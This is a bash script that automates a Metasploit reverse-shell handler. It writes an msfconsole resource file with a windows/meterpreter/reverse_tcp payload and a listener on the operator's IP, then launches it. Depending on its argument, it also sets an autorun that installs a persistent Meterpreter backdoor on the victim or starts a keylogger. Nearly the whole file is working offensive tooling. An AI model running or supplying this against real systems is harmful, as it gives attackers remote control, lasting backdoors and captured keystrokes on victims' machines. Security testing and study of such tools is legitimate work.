#!/usr/bin/env bash

resource=metasploit/resources
scripts=metasploit/scripts
autoRun=metasploit/autorun

cat $resource/metasploit_todo

read -p "Enter handler (default exploit/multi/handler): " handler
if [ -z $handler ]
then
	handler="exploit/multi/handler"
fi

read -p "Enter payload (default windows/meterpreter/reverse_tcp): " payload
if [ -z $payload ]
then
	payload="windows/meterpreter/reverse_tcp"
fi

read -p "Enter LHOST IP (default your system IP): " lhost
if [ -z $lhost ]
then
	lhost="$(ifconfig | grep -i "broadcast" | grep inet | awk '{print $2}')"
fi

read -p "Enter LPORT (default 4444): " lport
if [ -z $lport ]
then
	lport="4444"
fi

# writing .rc file for msfconsle
> $scripts/custom_script.rc
echo "use $handler" >> $scripts/custom_script.rc
echo "set payload $payload" >> $scripts/custom_script.rc
echo "set LHOST $lhost" >> $scripts/custom_script.rc
echo "set LPORT $lport" >> $scripts/custom_script.rc

if [ $1 -eq 2 ]
then
	#make backdoor script file
	echo "persistence -U -i 10 -r $lhost -p $lport -P windows/x64/meterpreter_reverse_tcp" > $autoRun/backdoor.rc
	echo "set AutoRunScript multiscript -rc $autoRun/backdoor.rc" >> $scripts/custom_script.rc
elif [ $1 -eq 3 ]
then
	echo "set AutoRunScript multi_console_command -rc $autoRun/keyLogger.rc" >> $scripts/custom_script.rc
fi

echo "exploit" >> $scripts/custom_script.rc
#cat $scripts/custom_script.rc
#exit 0
echo "Starting Metasploit Framework ...................."
msfconsole -r $scripts/custom_script.rc

exit 0

